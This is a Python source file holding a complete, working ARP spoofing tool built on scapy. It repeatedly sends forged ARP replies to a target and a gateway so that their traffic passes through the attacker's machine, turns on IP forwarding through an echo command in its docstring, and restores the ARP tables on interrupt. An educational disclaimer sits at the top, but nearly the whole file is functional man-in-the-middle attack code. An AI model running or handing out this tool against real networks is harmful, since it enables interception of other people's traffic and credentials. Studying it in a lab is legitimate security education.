#!/usr/bin/env python
import argparse
from scapy.all import ARP, send, Ether, srp
import time

"""Important Points:

Ethics and Legality: Use this script only in a legal and ethical manner. Unauthorized use of ARP spoofing is illegal.
Controlled Environment: Use it in a controlled environment like a lab or a test network.
Purpose: This script is intended for educational purposes to understand network security concepts.
Be sure to understand the implications and use it responsibly.
python arpSpoof.py [Target IP] [Gateway IP]
[-] echo 1 > /proc/sys/net/ipv4/ip_forward
"""

def get_mac(ip):
    """
    Returns the MAC address for a given IP.

    The function sends an ARP request to the IP address and waits for the response.
    The response contains the MAC address of the IP address.

    Args:
        ip (str): The IP address to query for its MAC address.

    Returns:
        str: The MAC address corresponding to the input IP.
    """
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    """
    Sends a falsified ARP response to 'target_ip' pretending to be 'spoof_ip'.

    This makes the target_ip think that the MAC address of the spoof_ip is the MAC address of this machine (attacker).
    As a result, the target sends the packets to the attacker instead of the spoof_ip.

    Args:
        target_ip (str): The IP address of the target machine to spoof.
        spoof_ip (str): The IP address to impersonate.
    """
    target_mac = get_mac(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(destination_ip, source_ip):
    """
    Restores the network by sending correct ARP responses.

    This function is used to undo the effect of the ARP spoofing attack,
    by informing both the target and the gateway of their true MAC addresses.

    Args:
        destination_ip (str): The IP address of the destination machine.
        source_ip (str): The IP address of the source machine.
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

# Setup argparse for command line arguments
parser = argparse.ArgumentParser(description="ARP Spoofing Script")
parser.add_argument("-t","--target", help="The IP address of the target machine")
parser.add_argument("-g","--gateway", help="The IP address of the gateway")

args = parser.parse_args()

target_ip = args.target
gateway_ip = args.gateway

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\rPackets sent: " + str(sent_packets_count), end="")
        time.sleep(2) # Waits for two seconds

except KeyboardInterrupt:
    print("\nDetected CTRL + C ..... Resetting ARP tables..... Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
